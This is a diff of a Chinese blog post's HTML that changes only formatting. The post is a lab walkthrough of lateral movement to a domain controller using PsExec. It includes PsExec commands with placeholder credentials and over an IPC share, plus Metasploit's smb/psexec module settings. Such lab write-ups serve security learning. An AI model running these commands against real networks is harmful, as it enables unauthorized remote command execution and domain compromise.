@@ -88,7 +88,7 @@
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>文章字数</i>
-                    3.1k
+                    2.8k
                 </span>
                 
                 
@@ -140,12 +140,12 @@
 <p>首先看看ip<br><img src="/2020/02/04/利用PsExec进行横向渗透/ipconfig.png" alt><br>没发现域控在那台机器，win7的ip是192.168.43.102<br><img src="/2020/02/04/利用PsExec进行横向渗透/domain.png" alt><br>查看域<br><img src="/2020/02/04/利用PsExec进行横向渗透/hacke.png" alt><br>查看域内其他主机<br><img src="/2020/02/04/利用PsExec进行横向渗透/nslookup.png" alt><br>利用nslookup定位DC</p>
 <p>这里我并未对DC做设置，所以默认的时候ADMIN$是共享状态，你也可以使用net share命令查看共享的资源</p>
 <h2 id="无IPC连接"><a href="#无IPC连接" class="headerlink" title="无IPC连接"></a>无IPC连接</h2><p>我们在win7的机器上查看了解情况，若无共享的连接，则我们在使用PsExec的时候需要使用账号密码进行验证<br><img src="/2020/02/04/利用PsExec进行横向渗透/use.png" alt></p>
-<figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\192.168.43.100 -u username -p password</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\192.168.43.100 -u username -p password</span><br></pre></td></tr></table></figure>
 <p><img src="/2020/02/04/利用PsExec进行横向渗透/none.png" alt><br>无需弹出新的cmd窗口，直接拿下域控</p>
 <h2 id="有IPC连接"><a href="#有IPC连接" class="headerlink" title="有IPC连接"></a>有IPC连接</h2><p><img src="/2020/02/04/利用PsExec进行横向渗透/yes.png" alt></p>
-<p>这个时候无需验证账号密码<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\192.168.43.100 cmd.exe</span><br></pre></td></tr></table></div></figure></p>
+<p>这个时候无需验证账号密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\192.168.43.100 cmd.exe</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2020/02/04/利用PsExec进行横向渗透/2.png" alt><br>成功啦~</p>
-<h2 id="Msf中的Psexec模块"><a href="#Msf中的Psexec模块" class="headerlink" title="Msf中的Psexec模块"></a>Msf中的Psexec模块</h2><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set RHOST 192.168.43.100</span><br><span class="line">set smbuser usernmae</span><br><span class="line">set smbpass password</span><br><span class="line">run</span><br></pre></td></tr></table></div></figure>
+<h2 id="Msf中的Psexec模块"><a href="#Msf中的Psexec模块" class="headerlink" title="Msf中的Psexec模块"></a>Msf中的Psexec模块</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set RHOST 192.168.43.100</span><br><span class="line">set smbuser usernmae</span><br><span class="line">set smbpass password</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 <p><img src="/2020/02/04/利用PsExec进行横向渗透/msf.png" alt></p>
 <p>这样就利用成功了</p>
 <p>总的来说这个psexec利用的方式就是，只要服务器上面有连接的IPC，就可以搞出cmd。</p>
